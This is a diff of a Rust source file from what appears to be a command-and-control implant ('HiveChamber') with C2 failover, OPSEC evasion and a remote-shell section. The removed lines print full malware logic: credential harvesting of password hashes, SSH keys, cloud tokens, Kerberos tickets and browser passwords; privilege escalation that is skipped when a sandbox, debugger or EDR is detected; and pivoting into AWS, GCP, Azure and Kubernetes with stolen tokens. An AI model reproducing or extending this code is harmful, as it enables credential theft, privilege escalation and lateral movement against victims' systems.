@@ -3,13 +3,13 @@
 // No sockets, no ports, no separate bus process.
 //
 // Integrated with OPSEC (jitter + decoys + schedule), multi-channel C2
-// failover, and automated credential harvesting.
+// failover and operator tasking.
 
 use crate::arena_mgr;
 use crate::identity::AgentIdentity;
-use crate::ldc::{Message, Role, Value};
+use crate::ldc::{Message, Role};
 use crate::shared_arena as arena;
-use crate::telemetry::{self, ColonyHealth, EventType, TelemetryCollector};
+use crate::telemetry::{self, EventType, TelemetryCollector};
 use ed25519_dalek::Signer;
 use std::path::PathBuf;
 use std::sync::atomic::{AtomicU64, Ordering};
@@ -19,9 +19,7 @@ use tracing::{info, warn};
 use uuid::Uuid;
 
 use crate::c2_channels::{C2ChannelConfig, ChannelKind, FailoverDirector, FailoverPolicy};
-use crate::cloud_worker::{CloudCredential, CloudProvider};
 use crate::opsec::OpsecEngine;
-use crate::privesc::{self, ExploitTracker};
 
 // ── HiveChamber ─────────────────────────────────────────────────────────────
 
@@ -34,7 +32,6 @@ pub struct HiveChamber {
     pub telemetry: Option<TelemetryCollector>,
     opsec_engine: Mutex<Option<OpsecEngine>>,
     failover: tokio::sync::Mutex<Option<FailoverDirector>>,
-    exploit_tracker: Mutex<ExploitTracker>,
 }
 
 impl HiveChamber {
@@ -88,7 +85,6 @@ impl HiveChamber {
             telemetry: Some(collector),
             opsec_engine: Mutex::new(None),
             failover: tokio::sync::Mutex::new(None),
-            exploit_tracker: Mutex::new(ExploitTracker::new()),
         })
     }
 
@@ -298,278 +294,6 @@ impl HiveChamber {
         }
     }
 
-    // ── send_harvest (automated credential harvesting) ────────────────────────
-
-    /// Run Leech credential harvesting and publish results as beliefs.
-    ///
-    /// Only executes if:
-    ///   - Evasion check passes (no sandbox/debugger/EDR)
-    ///   - Health status is not Critical
-    ///   - Role is Honeybee or Queen (workers don't harvest)
-    pub async fn send_harvest(&self) {
-        // Evasion check
-        let risks = crate::platform_layer::runtime::evasion_check();
-        if !risks.is_empty() {
-            info!("LEECH: harvest suppressed — risks detected: {:?}", risks);
-            return;
-        }
-
-        // Health check via telemetry AdaptiveSampler
-        if let Some(ref t) = self.telemetry {
-            let sampler_lock = t.sampler();
-            let sampler = sampler_lock.lock().await;
-            let health = sampler.health();
-            if health == ColonyHealth::Critical {
-                info!("LEECH: harvest suppressed — colony health is Critical");
-                return;
-            }
-        }
-
-        // Role filter: only Honeybee or Queen harvest
-        let role = self.role();
-        if role != Role::Honeybee && role != Role::Queen {
-            return;
-        }
-
-        info!("LEECH: starting credential harvest cycle");
-
-        let harvest = crate::leech::harvest_all();
-        info!("LEECH: harvested {} credentials", harvest.len());
-
-        for cred in &harvest {
-            let asset = format!(
-                "credential:{}",
-                match cred.credential_type {
-                    crate::leech::CredType::ShadowHash => "shadow",
-                    crate::leech::CredType::ProcessMemory => "proc_mem",
-                    crate::leech::CredType::SSHKey => "ssh_key",
-                    crate::leech::CredType::CloudTokenAWS => "cloud_aws",
-                    crate::leech::CredType::CloudTokenGCP => "cloud_gcp",
-                    crate::leech::CredType::CloudTokenAzure => "cloud_azure",
-                    crate::leech::CredType::CloudTokenK8s => "cloud_k8s",
-                    crate::leech::CredType::KerberosTGT => "krb_tgt",
-                    crate::leech::CredType::KerberosTGS => "krb_tgs",
-                    crate::leech::CredType::NTLMHash => "ntlm",
-                    crate::leech::CredType::ClearTextPassword => "cleartext",
-                    crate::leech::CredType::AccessToken => "access_token",
-                    crate::leech::CredType::RDPCredential => "rdp",
-                    crate::leech::CredType::VaultToken => "vault",
-                    crate::leech::CredType::GnupgKey => "gnupg",
-                    crate::leech::CredType::BrowserPassword => "browser",
-                }
-            );
-
-            let msg = Message::belief(
-                self.identity.id(),
-                self.role(),
-                asset,
-                Value::String(format!(
-                    "{}@{}:{}",
-                    cred.username, cred.domain, cred.source_process
-                )),
-                cred.priority as f32 / 10.0,
-            );
-            self.publish(msg).await;
-        }
-
-        if !harvest.is_empty() {
-            info!(
-                "LEECH: published {} credential beliefs to arena",
-                harvest.len()
-            );
-        }
-    }
-
-    // ── escalate_privileges (D-5: privilege escalation) ──────────────────────
-
-    /// Attempt privilege escalation with adaptive interval and health checks.
-    ///
-    /// Returns (attempted, success) where attempted=false if skipped.
-    /// Only executes if:
-    ///   - Evasion check passes (no sandbox/debugger/EDR)
-    ///   - Health status is not Critical
-    ///   - ExploitTracker says it's time to try
-    ///   - Role is Queen or Honeybee
-    pub async fn escalate_privileges(&self) -> (bool, bool) {
-        let role = self.role();
-        if role != Role::Queen && role != Role::Honeybee {
-            return (false, false);
-        }
-
-        // Evasion check
-        let risks = crate::platform_layer::runtime::evasion_check();
-        if !risks.is_empty() {
-            info!("PRIVESC: suppressed — risks detected: {:?}", risks);
-            return (false, false);
-        }
-
-        // Health check
-        if let Some(ref t) = self.telemetry {
-            let sampler_lock = t.sampler();
-            let sampler = sampler_lock.lock().await;
-            let health = sampler.health();
-            if health == ColonyHealth::Critical {
-                info!("PRIVESC: suppressed — colony health is Critical");
-                return (false, false);
-            }
-        }
-
-        // Adaptive interval check
-        {
-            let tracker = self.exploit_tracker.lock().unwrap();
-            if !tracker.should_attempt() {
-                info!(
-                    "PRIVESC: waiting {}s before next attempt",
-                    tracker.wait_seconds()
-                );
-                return (false, false);
-            }
-        }
-
-        info!("PRIVESC: scanning for escalation vectors");
-        let vectors = privesc::scan_privilege_escalation();
-
-        if vectors.is_empty() {
-            info!("PRIVESC: no vectors found");
-            return (true, false);
-        }
-
-        info!("PRIVESC: attempting escalation ({} vectors)", vectors.len());
-        let result = privesc::attempt_escalation(&vectors);
-
-        {
-            let mut tracker = self.exploit_tracker.lock().unwrap();
-            tracker.attempts += 1;
-            tracker.last_attempt = Some(std::time::Instant::now());
-            if result.success {
-                tracker.succeeded = result.root_shell;
-            }
-        }
-
-        // Publish result as belief
-        let status = if result.success { "achieved" } else { "failed" };
-        let outcome = format!("{}:{}", status, result.technique);
-        let msg = Message::belief(
-            self.identity.id(),
-            self.role(),
-            format!("lpe:{}", status),
-            Value::String(outcome),
-            if result.success { 1.0 } else { 0.3 },
-        );
-        self.publish(msg).await;
-
-        if result.success {
-            info!(
-                "PRIVESC: escalation SUCCESS — root_shell={}",
-                result.root_shell
-            );
-            // Re-run credential harvesting now with elevated privileges
-            self.send_harvest().await;
-        } else {
-            info!(
-                "PRIVESC: escalation FAILED — next in {}s",
-                self.exploit_tracker.lock().unwrap().wait_seconds()
-            );
-        }
-
-        (true, result.success)
-    }
-
-    // ── pivot_cloud (D-7: cloud worker) ──────────────────────────────────────
-
-    /// Pivot into cloud providers using credentials from the arena.
-    ///
-    /// Reads `credential:cloud:*` beliefs from latest messages, extracts tokens,
-    /// and runs CloudWorker::pivot_all() with rate limiting.
-    /// Returns (executed, resources_found).
-    pub async fn pivot_cloud(&self) -> (bool, u32) {
-        let role = self.role();
-        if role != Role::Queen && role != Role::Honeybee {
-            return (false, 0);
-        }
-
-        // Check basic internet connectivity
-        if !crate::cloud_worker::CloudWorker::check_connectivity() {
-            info!("CLOUD: no internet connectivity — skipping pivot");
-            return (false, 0);
-        }
-
-        // Collect cloud credentials from the arena
-        let messages = self.read_new().await;
-        let mut credentials = Vec::new();
-
-        for msg in &messages {
-            if let crate::ldc::Payload::Belief { asset, value, .. } = &msg.payload {
-                if !asset.starts_with("credential:cloud:") {
-                    continue;
-                }
-                let provider = match asset.as_str() {
-                    "credential:cloud:aws" => Some(CloudProvider::Aws),
-                    "credential:cloud:gcp" => Some(CloudProvider::Gcp),
-                    "credential:cloud:azure" => Some(CloudProvider::Azure),
-                    "credential:cloud:k8s" => Some(CloudProvider::K8s),
-                    _ => None,
-                };
-                if let Some(provider) = provider {
-                    let data = match value {
-                        Value::String(s) => s.clone(),
-                        _ => continue,
-                    };
-                    credentials.push(CloudCredential {
-                        provider,
-                        token: data,
-                        account_id: self.identity.id().to_string(),
-                        region: "us-east-1".into(),
-                        source: format!("arena:{}", msg.agent_id),
-                    });
-                }
-            }
-        }
-
-        if credentials.is_empty() {
-            info!("CLOUD: no cloud credentials found in arena");
-            return (false, 0);
-        }
-
-        info!(
-            "CLOUD: found {} cloud credentials, pivoting",
-            credentials.len()
-        );
-        let mut worker = crate::cloud_worker::CloudWorker::new();
-        let results = worker.pivot_all(&credentials);
-
-        let total_resources: u32 = results.iter().map(|r| r.resources_found).sum();
-
-        for result in &results {
-            let asset = format!(
-                "cloud:pivoted:{}:{}",
-                match result.provider {
-                    CloudProvider::Aws => "aws",
-                    CloudProvider::Gcp => "gcp",
-                    CloudProvider::Azure => "azure",
-                    CloudProvider::K8s => "k8s",
-                },
-                result.action.replace(' ', "_")
-            );
-
-            let msg = Message::belief(
-                self.identity.id(),
-                self.role(),
-                asset,
-                Value::String(format!("{}:{}", result.output, result.resources_found)),
-                if result.success { 0.8 } else { 0.2 },
-            );
-            self.publish(msg).await;
-        }
-
-        info!(
-            "CLOUD: pivot complete — {} results, {} total resources",
-            results.len(),
-            total_resources
-        );
-
-        (true, total_resources)
-    }
 
     // ── execute_command (D-6: remote shell via arena) ───────────────────────
 
